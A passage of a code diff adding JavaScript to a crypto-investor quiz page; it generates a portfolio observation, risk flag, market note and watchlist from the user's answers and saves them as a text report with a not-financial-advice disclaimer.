+    if(answers.portfolio === 'altheavy' && (answers.horizon === 'long')){
+      observation += `your concentration in altcoins sits somewhat at odds with a long holding period — altcoins typically carry higher volatility and less established liquidity than large caps, which matters more the longer you intend to hold.`;
+    } else if(answers.portfolio === 'btceth' && answers.horizon === 'short'){
+      observation += `your BTC/ETH-heavy positioning is generally built for stability rather than short-term moves — your holdings may be more conservative than your trading cadence suggests.`;
+    } else if(answers.portfolio === 'notyet'){
+      observation += `you're in a research phase. The highest-value step now is defining your allocation framework before capital is deployed, not picking individual assets first.`;
+    } else {
+      observation += `your current mix is broadly consistent with your stated time horizon. The opportunity now is refining position sizing and concentration rather than changing direction.`;
+    }
+    document.getElementById('resultObservation').textContent = observation;
+
+    // Risk flag
+    let risk = '';
+    if(answers.style === 'leverage' && (answers.risk === 'conservative' || answers.risk === 'moderate')){
+      risk = `You're using derivatives or leverage while describing your risk tolerance as ${answers.risk}. Leverage amplifies both gains and losses regardless of stated risk comfort — this mismatch is worth a closer look before your next position.`;
+    } else if(answers.style === 'active' && answers.horizon === 'long'){
+      risk = `You describe a long-term horizon but an active trading style. Frequent entries and exits on long-term capital often increase costs and tax events without necessarily improving outcomes versus a more disciplined approach.`;
+    } else if(answers.risk === 'maxrisk' && answers.portfolio === 'btceth'){
+      risk = `Your stated risk tolerance is high, but your current holdings are concentrated in lower-volatility large caps. There may be a gap between the risk you're prepared to take and the risk currently reflected in your portfolio.`;
+    } else if(answers.favorite === 'spec' && answers.horizon === 'long'){
+      risk = `Speculative and memecoin exposure typically carries elevated drawdown risk and thinner liquidity than major assets — worth sizing carefully if these positions are meant to be held long-term.`;
+    } else {
+      risk = `No major mismatch stood out between your stated risk tolerance, trading style, and time horizon. The opportunity now is monitoring position sizing as market structure shifts, rather than addressing a structural conflict.`;
+    }
+    document.getElementById('resultRisk').textContent = risk;
+
+    // Market structure note
+    const structureNotes = {
+      btcmax:'Bitcoin continues to function as the market\u2019s primary liquidity and sentiment anchor — moves in BTC dominance are typically the first signal worth tracking for broader market structure shifts.',
+      l1:'Layer-1 ecosystems remain sensitive to network activity, fee dynamics, and competing chain narratives — relative performance against BTC is often a useful gauge of risk appetite in the market.',
+      defi:'DeFi protocols are closely tied to on-chain liquidity conditions and total value locked trends — structural shifts here often lead broader altcoin sentiment by a cycle.',
+      l2:'Layer-2 and scaling infrastructure activity tends to track network adoption and fee compression trends — worth watching alongside underlying Layer-1 settlement activity.',
+      spec:'Speculative and memecoin activity tends to expand during periods of elevated risk appetite and contract sharply when liquidity tightens — it\u2019s typically a late-cycle signal rather than a leading one.',
+    };
+    document.getElementById('resultStructure').textContent = structureNotes[answers.favorite];
+
+    // Watchlist ideas (category-level, not specific buy recommendations)
+    const watchlistMap = {
+      btcmax:['Bitcoin dominance trend relative to total crypto market cap', 'On-chain accumulation activity among long-term holders', 'Macro liquidity conditions and their historical correlation with BTC'],
+      l1:['Relative performance of major Layer-1s against BTC', 'Network fee and activity trends across leading chains', 'Validator and staking participation rates as a network-health signal'],
+      defi:['Total value locked trends across leading DeFi protocols', 'Stablecoin supply growth as a liquidity indicator', 'Lending and borrowing rate trends across major platforms'],
+      l2:['Layer-2 transaction volume relative to Layer-1 settlement', 'Bridge activity and total value bridged trends', 'Fee compression trends as scaling solutions mature'],
+      spec:['Overall market risk appetite indicators before allocating further', 'Liquidity depth on any speculative position before entry', 'Broader altcoin season indicators as a timing reference'],
+    };
+    const watchlist = watchlistMap[answers.favorite];
+    document.getElementById('resultWatchlist').innerHTML = watchlist.map(w=>`<li>${w}</li>`).join('');
+
+    document.getElementById('resultHeadline').textContent = `Here's what your answers reveal.`;
+
+    result.scrollIntoView({behavior:'smooth', block:'start'});
+  }
+
+  function downloadReport(){
+    const lines = [
+      'MY THE BLOCK CRYPTO INTELLIGENCE REPORT',
+      '',
+      'PORTFOLIO OBSERVATION',
+      document.getElementById('resultObservation').textContent,
+      '',
+      'RISK FLAG',
+      document.getElementById('resultRisk').textContent,
+      '',
+      'MARKET STRUCTURE NOTE',
+      document.getElementById('resultStructure').textContent,
+      '',
+      'YOUR WATCHLIST',
+      ...Array.from(document.querySelectorAll('#resultWatchlist li')).map((li,i)=>`${i+1}. ${li.textContent}`),
+      '',
+      'This report is generated from self-reported answers for educational and research purposes only. It is not financial advice and not a recommendation to buy, sell, or hold any asset.',
+    ];
+    const blob = new Blob([lines.join('\n')], {type:'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'my-the-block-crypto-intelligence-report.txt';
+    a.click();
+  }
+
+  renderStep();
 </script>
-</body></html>
+</body>
+</html>
